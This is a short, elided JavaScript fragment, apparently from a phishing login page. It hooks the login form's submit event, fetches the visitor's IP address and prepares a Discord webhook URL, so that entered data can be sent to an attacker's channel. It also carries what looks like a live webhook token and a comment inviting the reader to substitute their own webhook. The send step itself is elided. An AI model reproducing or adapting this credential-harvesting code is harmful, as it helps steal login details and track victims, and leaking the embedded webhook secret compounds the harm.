...
document.getElementById('loginForm').addEventListener('submit', function(event) {
    ...
    fetch('https://api.ipify.org?format=json')
        ...
        .then(data => {
            ...
            const webhookUrl = 'https://discord.com/api/webhooks/1306895760855666698/1QY7t_-gqiv3mF0muYgAohVFNJf89KlsHJ9ITq_emSXGLHDNA3kKH3CHl5F1JBUbBtee';  // Replace with your Discord webhook
